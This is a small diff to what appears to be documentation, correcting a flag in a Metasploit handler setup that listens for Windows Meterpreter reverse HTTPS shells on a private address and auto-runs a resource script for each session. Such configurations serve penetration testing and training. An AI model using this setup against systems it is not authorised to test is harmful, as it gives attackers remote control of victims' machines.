@@ -56,7 +56,7 @@ set PAYLOAD windows/meterpreter/reverse_https
 set LHOST 192.168.1.101
 set LPORT 13002
 set ExitOnSession false
-set AutoRunScript multi_console_command -rc /home/user/auto.rc
+set AutoRunScript multi_console_command -r /home/user/auto.rc
 exploit -j
 ```
 
